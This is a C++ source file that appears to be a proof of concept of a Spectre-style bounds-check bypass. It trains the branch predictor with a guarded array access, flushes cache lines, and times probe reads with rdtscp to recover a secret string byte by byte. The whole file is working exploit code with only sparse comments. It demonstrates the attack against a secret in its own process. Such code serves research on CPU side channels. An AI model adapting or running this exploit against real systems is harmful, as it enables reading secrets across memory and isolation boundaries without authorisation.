//
// Created by aris on 1/20/22.
//

#include <iostream>
#include <cstring>
#include <x86intrin.h>
#include <random>
#include <algorithm>

using namespace std;

using uint = unsigned int;
using ull = long long;
using uchar = unsigned char;

const ull INF = 1e18;

int training_size = 100; // if you change the value then change str 25(training[])
const int training_itterations = 1000;

#define cache_line_size 512 // depends on device

uchar training[100];
uchar cache[cache_line_size * 256]; 

void my_assert(bool condition, const char *message) {
    if (condition == false) {
        printf("%s\n", message);
        abort();
    }
}

int min_bound = 0;
uint access(ull x) {
    if (min_bound <= x && x < training_size) {
        return cache[training[x] * cache_line_size];
    }
    return -1;
}

void wait() {
    for (int i = 0; i < 100; i++) { }
    __sync_synchronize();
}// for process synchronize

uchar read_char(long long address) {
    long long x = 0;
    uint not_optimize = -1;
    uchar best = 0;
    ull min_time = INF;

    for (int i = 0; i < 256; i++) {
        _mm_clflush(&cache[i * cache_line_size]);
    }
    long long ord[training_size];
    for (int i = 0; i < training_size; i++) {
        ord[i] = i % 10 == 0 ? address : i;
    }
    random_shuffle(ord, ord + training_size);
    for (ull i = 0; i < training_size; i++) {
        _mm_clflush(&training_size);
        _mm_clflush(&min_bound);
        wait();
        x = ord[i];
        access(x);
    }

    for (int i = 0; i < training_size; i++) {
        if (ord[i] != address) {
            _mm_clflush(&cache[training[ord[i]] * cache_line_size]);
        }
    }
    // _mm_clflush(&cache[training[training_x] * cache_line_size]);
    int shuffle_char[256];
    for (int i = 0; i < 256; i++) {
        shuffle_char[i] = i;
    }
    random_shuffle(shuffle_char, shuffle_char + 256);
    for (int i = 0; i < 256; i++) {
        int ch = shuffle_char[i];

        uchar *cur_address = &cache[ch * cache_line_size];
        wait();
        ull start = __rdtscp(&not_optimize);
        not_optimize = *cur_address;
        ull cur_time = __rdtscp(&not_optimize) - start; //

        if (min_time > cur_time) {
            min_time = cur_time;
            best = uchar(ch);
        }
    }
    
    return best;
}

FILE *out_file;
bool to_file = false;

uchar get_next_char(long long address) {
    int cnt_best[256];
    for (uint i = 0; i < 256; i++) cnt_best[i] = 0;

    for (uint itter = 0; itter < training_itterations; itter++) {
        cnt_best[read_char(address)]++;
    }

    uchar mx = 0;
    for (uint i = 0; i < 256; i++) {
        if (cnt_best[mx] < cnt_best[i]) {
            mx = uchar(i);
        }
    }
    if (to_file) {
        fprintf(out_file, "Best value is : %c; code: %u\n", char(mx), mx);
        fprintf(out_file, "was best in %i cases of %i\n\n", cnt_best[mx], training_itterations);
    } else {
        printf("Best value is : %c; code: %u\n", uchar(mx), mx);
        printf("was best in %i cases of %i\n\n", cnt_best[mx], training_itterations);
    }
    return mx;
}

bool is_right(char *secret, char *result) {
    if (strlen(secret) > strlen(result)) return false;
    for (uint i = 0; i < strlen(secret); i++) {
        if (secret[i] != result[i]) return false;
    }
    return true;
}

signed main(int argc, char *argv[]) {
    my_assert(2 <= argc && argc <= 3, "Expected argument as: <data> [<output_file>]");
    if (argc == 3) {
        out_file = fopen(argv[2], "w");
        my_assert(out_file != NULL, "Can not open output file");
        to_file = true;
    }
    char *secret = argv[1];
    size_t len = strlen(secret);

    long long addr = (long long)(&secret[0] - (char *)(training));
    // training[addr] is equal to secret[0]
    // printf("!! %lli", addr);
    // printf("%c\n", training[addr]);

    for (int i = 0; i < training_size; i++) {
        training[i] = uchar(i % 16); // empty codes for training
    }
    for (uint i = 0; i < cache_line_size * 256; i++) {
        cache[i] = 1; // non-zero values, so proc can't optimize
    }

    char *result = new char[len];
    for (uint i = 0; i < len; i++) {
        uchar val = get_next_char(addr++);
        result[i] = char(val);
    }

    if (to_file) fprintf(out_file, "Want to get:\n%s\n", secret);
    else printf("Want to get:\n%s\n", secret);

    if (to_file) fprintf(out_file, "Got data:\n%s\n\n", result);
    else printf("Got data:\n%s\n\n", result);

    if (is_right(secret, result)) {
        if (to_file) fprintf(out_file, "Success\n");
        else printf("Success\n");
    } else {
        if (to_file) fprintf(out_file, "Wrong secret found\n");
        else printf("Wrong secret found\n");
    }
    return 0;
}